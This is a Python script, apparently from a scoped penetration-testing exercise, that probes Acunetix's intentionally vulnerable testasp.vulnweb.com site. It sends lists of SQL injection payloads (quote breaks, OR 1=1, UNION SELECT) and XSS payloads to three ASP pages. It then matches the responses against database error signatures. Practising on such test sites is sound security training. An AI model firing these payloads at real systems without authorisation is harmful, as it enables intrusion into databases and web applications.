#!/usr/bin/env python3
"""Round 3 exploit — classic ASP/Acunetix testasp SQLi 표면 1차 프로브.

각 벡터에 payload를 넣어 (a) 베이스라인 대비 응답 변화, (b) DB 에러 메시지 노출 여부를
본다. 전부 GET/읽기 요청이며 스코프(testasp.vulnweb.com) 안이다.
"""
import subprocess, hashlib, urllib.parse, re, json, sys

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]

ERR_SIGS = [
    "Microsoft OLE DB Provider for SQL Server",
    "Microsoft OLE DB Provider for ODBC Drivers",
    "Microsoft JET Database Engine",
    "ODBC Drivers error",
    "ADODB.",
    "Incorrect syntax near",
    "Unclosed quotation mark",
    "80040e14", "80040e07", "80004005",
    "Syntax error in",
    "Microsoft VBScript runtime error",
    "Microsoft VBScript compiler error",
    "SQL Server",
    "OLE DB",
    "ODBC",
    "error '800",
    "Internal Server Error",
]


def get(url):
    p = subprocess.run(["curl", "-s", "-i", "-m", "25"] + PROXY + [url],
                       capture_output=True, text=True, errors="replace")
    raw = p.stdout
    head, _, body = raw.partition("\r\n\r\n")
    code = raw.split("\n", 1)[0].strip()
    return code, len(raw), hashlib.sha256(raw.encode()).hexdigest()[:12], head, body


def probe(label, url, baseline_hash=None, baseline_len=None):
    code, ln, h, head, body = get(url)
    hits = []
    for s in ERR_SIGS:
        if s.lower() in body.lower():
            i = body.lower().index(s.lower())
            hits.append(body[max(0, i - 60):i + 160].replace("\r", " ").replace("\n", " "))
    delta = "" if baseline_hash is None else ("SAME" if h == baseline_hash else f"DIFF({ln - baseline_len:+d}B)")
    print(f"\n--- {label}")
    print(f"    URL : {url}")
    print(f"    HTTP: {code}  len={ln}  sha={h}  vs-baseline={delta}")
    if hits:
        for x in hits[:3]:
            print(f"    ⚠ ERR-SIG: ...{x.strip()}...")
    return h, ln, body


results = {}

print("=" * 90)
print("### A. /showforum.asp?id=<payload>")
base_h, base_l, _ = probe("baseline id=1", f"{BASE}/showforum.asp?id=1")
for pay in ["1'", "1''", "1'--", "1 AND 1=1", "1 AND 1=2", "1 OR 1=1", "abc", "-1", "1;--",
            "0 OR 1=1", "1 UNION SELECT 1", "1'+OR+'1'='1"]:
    probe(f"id={pay}", f"{BASE}/showforum.asp?id={urllib.parse.quote(pay)}", base_h, base_l)

print()
print("=" * 90)
print("### B. /showthread.asp?id=<payload>")
base_h2, base_l2, _ = probe("baseline id=0", f"{BASE}/showthread.asp?id=0")
for pay in ["0'", "0''", "0'--", "0 AND 1=1", "0 AND 1=2", "abc", "-1", "0 OR 1=1"]:
    probe(f"id={pay}", f"{BASE}/showthread.asp?id={urllib.parse.quote(pay)}", base_h2, base_l2)

print()
print("=" * 90)
print("### C. /Search.asp?tfSearch=<payload>")
base_h3, base_l3, _ = probe("baseline tfSearch=weather", f"{BASE}/Search.asp?tfSearch=weather")
for pay in ["'", "''", "a'--", "search' OR '1'='1", "0 OR 1=1", "<b>x</b>", "<script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>"]:
    probe(f"tfSearch={pay}", f"{BASE}/Search.asp?tfSearch={urllib.parse.quote(pay)}", base_h3, base_l3)
